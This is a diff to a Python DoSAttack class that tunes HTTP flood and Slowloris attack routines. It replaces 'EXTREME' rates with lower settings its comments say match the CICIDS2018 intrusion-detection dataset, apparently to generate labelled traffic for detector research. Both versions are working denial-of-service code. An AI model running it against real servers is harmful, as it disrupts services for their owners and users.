@@ -125,8 +125,19 @@ class DoSAttack:
                 attack_port = random.choice(ports)
                 sock.connect((self.target_ip, attack_port))
 
-                # EXTREME: 500-2000 requests per connection (10x increase from current, 500-2000x from original)
-                num_reqs = random.randint(500, 2000)
+                # CORRECT CICIDS2018: 1-5 requests per connection (NOT 500+)
+                # Distribution: 70% 1-req, 15% 2-req, 10% 3-req, 3% 4-req, 2% 5-req
+                rand_val = random.random()
+                if rand_val < 0.70:
+                    num_reqs = 1
+                elif rand_val < 0.85:
+                    num_reqs = 2
+                elif rand_val < 0.95:
+                    num_reqs = 3
+                elif rand_val < 0.98:
+                    num_reqs = 4
+                else:
+                    num_reqs = 5
                 
                 for _ in range(num_reqs):
                     path = "/" + _random_string(random.randint(5, 15)) + _random_url_params(random.randint(1, 8))
@@ -152,9 +163,6 @@ class DoSAttack:
                     except socket.timeout:
                         pass
                     sock.settimeout(5)
-                    
-                    # No delay between requests - maximum throughput
-                    time.sleep(random.uniform(0.0001, 0.0005))
 
                 # Read response briefly then close
                 try:
@@ -167,8 +175,8 @@ class DoSAttack:
             except Exception:
                 pass
 
-            # THROTTLED: Increased delay for realistic rate (~3-5 flows per 60 sec from HTTP)
-            time.sleep(random.uniform(2.0, 3.0))  # Was 0.005-0.05 (too aggressive)
+            # CORRECT: 2-3 second delay between NEW connections (this creates rapid fire of flows)
+            time.sleep(random.uniform(2.0, 3.0))
 
     # ──────────────────────────────────────────────────────
     # SLOWLORIS — Hold connections open with incomplete headers
@@ -184,8 +192,8 @@ class DoSAttack:
         sockets = []
 
         # Phase 1: Open initial batch of sockets with partial headers
-        # EXTREME: 2000-5000 connections (10x increase from current 200-500)
-        target_conns = random.randint(2000, min(5000, self.duration * 50))
+        # CORRECT CICIDS2018: 50-150 connections (not 2000-5000)
+        target_conns = random.randint(50, min(150, self.duration // 2))
         
         for _ in range(target_conns):
             if not self.running or time.time() >= end_time:
@@ -217,8 +225,8 @@ class DoSAttack:
             alive = []
             for sock in sockets:
                 try:
-                    # EXTREME: Send 10-20 header lines per keep-alive round (was 3-5)
-                    for _ in range(random.randint(10, 20)):
+                    # CORRECT CICIDS2018: Send 1-2 header lines per keep-alive (SLOW!)
+                    for _ in range(random.randint(1, 2)):
                         header_line = f"X-{_random_string(6)}: {_random_string(16)}\r\n"
                         sock.sendall(header_line.encode())
                         self._inc_count()
@@ -250,8 +258,9 @@ class DoSAttack:
                 except Exception:
                     pass
 
-            # EXTREME SPEED: 0.5-1 seconds between keep-alive rounds (was 3-5) - 5-10x more packets
-            time.sleep(random.uniform(0.5, 1.0))
+            # CORRECT CICIDS2018: 10-15 second keep-alive intervals (SLOW!)
+            # This creates high Fwd IAT Mean which matches Slowloris signature
+            time.sleep(random.uniform(10.0, 15.0))
 
         # Cleanup
         for sock in sockets:
